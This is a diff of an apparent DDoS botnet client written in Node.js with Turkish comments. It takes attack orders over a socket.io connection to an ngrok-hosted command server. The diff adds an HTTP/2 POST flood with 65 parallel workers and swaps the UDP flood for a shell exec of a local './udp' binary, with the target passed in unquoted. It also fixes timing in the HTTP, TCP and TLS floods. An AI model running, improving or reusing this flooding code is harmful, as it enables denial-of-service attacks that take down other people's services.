@@ -8,10 +8,11 @@ const http2 = require("http2");
 const dgram = require('dgram');
 const net = require("net");
 const { faker } = require("@faker-js/faker");
+const { exec } = require('child_process');
 
 
 // WebSocket bağlantısı
-const socket = io("https://b02a-176-240-67-249.ngrok-free.app");
+const socket = io("https://881c-176-240-67-87.ngrok-free.app");
 
 let isFlooding = false;
 let floodingTimeout;
@@ -21,7 +22,7 @@ socket.on("connect", () => {
   console.log("Server'a bağlanıldı!");
 });
 
-// WebSocket'ten gelen yeni mesajları dinliyoruz
+// WebSocket'ten gelen veriye göre HTTP/2 Flood başlatma
 socket.on("new_message", (data) => {
   console.log("Yeni mesaj:", data);
 
@@ -31,9 +32,12 @@ socket.on("new_message", (data) => {
   } else if (data && data.method === "http-mix") {
     console.log("HTTP Mix saldırısı başlatılıyor...");
     startFlooding(data.url, data.port, data.duration, "http-mix");
+  } else if (data && data.method === "http2") {
+    console.log("HTTP/2 Flood saldırısı başlatılıyor...");
+    startHttp2Flooding(data.url, data.port, data.duration);
   } else if (data && data.method === "tls") {
     console.log("TLS saldırısı başlatılıyor...");
-    startTlsFlooding(data.url, data.duration);
+    startTlsFlooding(data.target, data.time);
   } else if (data && data.method === "tcpflood") {
     console.log("TCP Flood saldırısı başlatılıyor...");
     startTcpFlooding(data.url, data.port, data.duration);
@@ -149,46 +153,31 @@ function startUdpFlooding(targetIP, targetPort, duration) {
   }
 
   isFlooding = true;
-  const packetSize = 1024; // 1 KB veri
-  const threadCount = 50; // Paralel çalışan işçi işlemler
-  const endTime = Date.now() + duration * 1000; // Saldırının bitiş zamanı
-  const message = Buffer.alloc(packetSize, 'X'); // Rastgele veri oluştur
-
   console.log(`UDP Flood saldırısı başlatıldı. ${duration} saniye boyunca hedef: ${targetIP}:${targetPort}`);
 
   floodingTimeout = setTimeout(() => {
     stopFlooding(); // Süre bitince saldırıyı durduruyoruz
-  }, duration * 1000);
+  }, duration);
 
-  // Paralel işçi işlemleri başlat
-  for (let i = 0; i < threadCount; i++) {
-    floodUdp(targetIP, targetPort, message, endTime);
-  }
-}
-
-// UDP Flood'un bir işçi fonksiyonu
-function floodUdp(targetIP, targetPort, message, endTime) {
-  const client = dgram.createSocket('udp4');
-
-  const sendPackets = setInterval(() => {
-    if (!isFlooding || Date.now() >= endTime) { // isFlooding kontrolü eklendi
-      clearInterval(sendPackets); // Saldırı süresi bittiğinde durdur
-      client.close();
-    } else {
-      client.send(message, targetPort, targetIP, (err) => {
-        if (err) {
-          console.log("Hata oluştu:", err);
-        }
-      });
+  // Terminal komutunu çalıştır
+  exec(`./udp ${targetIP} ${targetPort} ${duration}`, (err, stdout, stderr) => {
+    if (err) {
+      console.log("Hata oluştu:", err);
+      return;
     }
-  }, 0); // Hızlı paket gönderimi
+    if (stderr) {
+      console.log("stderr:", stderr);
+      return;
+    }
+    console.log("stdout:", stdout);
+  });
 }
 
 
 function startTcpFlooding(targetIP, targetPort, duration) {
   const threadCount = 52; // Sabit thread sayısı
   const payload = crypto.randomBytes(5024); // 1 KB veri
-  const endTime = Date.now() + duration;
+  const endTime = Date.now() + duration * 1000;
 
   if (isFlooding) {
     console.log("Zaten saldırı yapılıyor.");
@@ -203,7 +192,7 @@ function startTcpFlooding(targetIP, targetPort, duration) {
   floodingTimeout = setTimeout(() => {
     console.log("Saldırı sona erdi.");
     stopFlooding(); // Saldırı süresi bitince saldırıyı durduruyoruz
-  }, duration);
+  }, duration * 1000);
 
   for (let i = 0; i < threadCount; i++) {
     createPersistentConnection(i, targetIP, targetPort, payload, endTime);
@@ -276,7 +265,7 @@ function startFlooding(targetUrl, port, duration, method) {
   const url = new URL(targetUrl);
   const protocol = url.protocol === "https:" ? https : http;
   const threadCount = 58;
-  const endTime = Date.now() + duration;
+  const endTime = Date.now() + duration * 1000;
 
   if (isFlooding) {
     console.log("Zaten saldırı yapılıyor.");
@@ -285,12 +274,12 @@ function startFlooding(targetUrl, port, duration, method) {
 
   isFlooding = true;
   console.log(
-    `${method.toUpperCase()} saldırısı başlatıldı. ${duration} ms boyunca hedef: ${targetUrl}`,
+    `${method.toUpperCase()} saldırısı başlatıldı. ${duration} saniye boyunca hedef: ${targetUrl}`,
   );
 
   floodingTimeout = setTimeout(() => {
     stopFlooding();
-  }, duration);
+  }, duration * 1000);
 
   for (let i = 0; i < threadCount; i++) {
     (function flood() {
@@ -348,8 +337,70 @@ process.on("uncaughtException", () => {});
 
 process.on("unhandledRejection", () => {});
 
-function startTlsFlooding(targetUrl, duration) {
-  const parsedTarget = new URL(targetUrl);
+
+// HTTP/2 Flood saldırısını başlatma fonksiyonu
+async function startHttp2Flooding(targetUrl, port, duration) {
+  const threadCount = 65; // Paralel istek sayısı
+  const endTime = Date.now() + duration * 1000;
+
+  console.log(`HTTP/2 Flood saldırısı başlatıldı. ${duration} saniye boyunca hedef: ${targetUrl}`);
+
+  floodingTimeout = setTimeout(() => {
+    stopFlooding();
+  }, duration * 1000);
+
+  const floodPromises = [];
+  for (let i = 0; i < threadCount; i++) {
+    floodPromises.push(sendHttp2Flood(targetUrl, port, endTime));
+  }
+
+  await Promise.all(floodPromises);
+}
+
+// HTTP/2 Flood'un bir işçi fonksiyonu
+async function sendHttp2Flood(targetUrl, port, endTime) {
+  const client = http2.connect(targetUrl);
+
+  client.on("error", (err) => {
+    console.error("Connection error:", err.message);
+  });
+
+  while (Date.now() < endTime) {
+    try {
+      const headers = {
+        ":method": "POST",
+        ":path": "/",
+        ...generateRandomHeaders(),
+      };
+      const data = generateRandomData();
+
+      const req = client.request(headers);
+      req.setEncoding("utf8");
+
+      req.write(data);
+      req.end();
+
+      req.on("response", (headers) => {
+        // Gelen cevabı loglama (isteğe bağlı)
+        //console.log("Response status:", headers[":status"]);
+      });
+
+      req.on("error", (err) => {
+        //console.error("Request error:", err.message);
+      });
+
+      // Performans için bekleme süresi
+      await new Promise((resolve) => setTimeout(resolve, 0));  // Çok kısa bir süre, ama sunucuyu aşırı zorlamaz
+    } catch (err) {
+      //console.error("Error during flood:", err.message);
+    }
+  }
+
+  client.close();
+}
+
+function startTlsFlooding(target, time) {
+  const parsedTarget = new URL(target);
 
   const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
   const ciphers =
@@ -384,7 +435,7 @@ function startTlsFlooding(targetUrl, duration) {
 
   floodingTimeout = setTimeout(() => {
     stopFlooding();
-  }, duration);
+  }, time);
 
   const settings = {
     enablePush: false,
